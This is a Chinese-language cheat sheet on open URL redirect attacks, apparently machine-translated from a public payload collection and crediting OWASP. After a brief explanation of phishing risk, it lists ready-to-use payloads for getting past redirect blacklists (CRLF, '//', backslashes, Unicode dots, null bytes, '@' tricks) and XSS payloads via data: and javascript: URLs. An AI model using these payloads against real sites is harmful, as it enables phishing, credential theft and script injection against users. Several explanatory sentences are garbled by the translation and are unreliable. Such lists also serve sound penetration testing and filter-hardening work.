# 开放URL重定向
	
当web应用程序接受可能导致web应用程序将请求重定向到不可信输入的URL时,多组重定向和转发是可能的。通过将不受信任的URL输入修改为恶意站点,攻击者可能成功启动网络钓鱼欺诈和窃取用户凭据。由于修改链接中的服务器名称与原始站点相同,网络钓鱼尝试可能具有更值得信任的外观。多组重定向和向前攻击还可以用于恶意创建一个URL,该URL将通过应用程序的访问控制检查然后交给攻击者通常无法访问的特权函数。
## 攻击
 
使用crlf绕过“JavaScript”黑名单关键字
```
java%0d%0ascript%0d%0a:alert(0)
```

使用“//”绕过“http”黑名单关键字
```
//google.com
```

使用“https :”绕过“/ / //”黑名单关键字
```
https:google.com
```

使用“\ /”绕过“/ /”黑名单关键字(浏览器,请参见\ / / )
```
\/\/google.com/
/\/google.com/ 
```


使用“% E3 % 80% 80%82”进行绕过。"黑名单中的字符
```
//google%E3%80%82com
```


使用空字节“%00”绕过黑名单筛选器
```
//google%00.com
```

使用“@”字符,浏览器将重定向至“@”后面的内容
```
http://www.theirsite.com@yoursite.com/
```

创建文件夹作为其域
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```


从今以后从打开的URL-如果它在一个js变量中
```
";alert(0);//
```

来自数据的XSS : //包装
```
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

来自JavaScript : / /包装的XSS
```
http://www.example.com/redirect.php?url=javascript:prompt(1)
```


## 感谢
* filedescriptor
* https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
